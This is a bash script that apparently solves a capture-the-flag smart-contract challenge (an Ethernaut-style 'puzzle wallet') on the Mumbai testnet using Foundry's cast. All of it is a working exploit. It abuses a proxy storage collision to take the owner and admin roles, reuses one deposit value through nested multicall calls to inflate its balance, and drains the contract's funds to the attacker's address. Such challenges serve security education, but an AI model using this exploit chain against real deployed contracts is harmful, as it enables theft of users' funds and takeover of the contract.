#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

ADDRESS="$(cast wallet address $PRIVATE_KEY)"

echo "[INFO] Exploiting proposeNewAdmin to gain Owner role..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key "$PRIVATE_KEY" \
    "$CONTRACT_ADDRESS" \
    "proposeNewAdmin(address)" \
    "$ADDRESS"

echo "[INFO] Adding address to whitelist..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key "$PRIVATE_KEY" \
    "$CONTRACT_ADDRESS" \
    "addToWhitelist(address)" \
    "$ADDRESS"

BALANCE=$(cast balance \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS")
echo "[INFO] Contract current balance: $BALANCE" >&2

DEPOSIT_CALLDATA=$(cast calldata "deposit()")
MULTICALL_DEPOSIT_CALLDATA=$(cast calldata "multicall(bytes[] calldata)" [$DEPOSIT_CALLDATA])
EXPLOIT_DATA="[${MULTICALL_DEPOSIT_CALLDATA},${MULTICALL_DEPOSIT_CALLDATA}]"

echo "[INFO] Exploiting multicall vulnerability" >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key "$PRIVATE_KEY" \
    --value $BALANCE \
    "$CONTRACT_ADDRESS" \
    "multicall(bytes[] calldata)" \
    "$EXPLOIT_DATA"

ADDRESS_BALANCE=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS" \
    "balances(address)(uint256)" \
    "$ADDRESS")
echo "[INFO] $ADDRESS balance: $ADDRESS_BALANCE" >&2

echo "[INFO] Draining contract balance..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key "$PRIVATE_KEY" \
    "$CONTRACT_ADDRESS" \
    "execute(address,uint256,bytes calldata)" \
    "$ADDRESS" \
    "$ADDRESS_BALANCE" \
    ""

BALANCE=$(cast balance \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS")
echo "[INFO] Contract current balance: $BALANCE" >&2

echo "[INFO] Exploiting setMaxBalance to gain admin..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key "$PRIVATE_KEY" \
    "$CONTRACT_ADDRESS" \
    "setMaxBalance(uint256)" \
    "$(echo $ADDRESS | sed s/0x/0x000000000000000000000000/)"

echo "[INFO] Checking contract admin..." >&2
ADMIN_ADDRESS=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS" \
    "admin()(address)")

if [ "$ADMIN_ADDRESS" = "$ADDRESS" ]
then
    echo "solved!"
else
    echo "[ERROR] exploit failed" >&2
fi
